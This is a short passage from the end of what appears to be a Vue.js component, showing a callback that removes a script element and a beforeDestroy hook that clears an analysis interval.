      script.remove();
    });
  },
  beforeDestroy() {
    // Clean up intervals
    if (this.analysisInterval) {
      clearInterval(this.analysisInterval);
    }
  }
}
</script>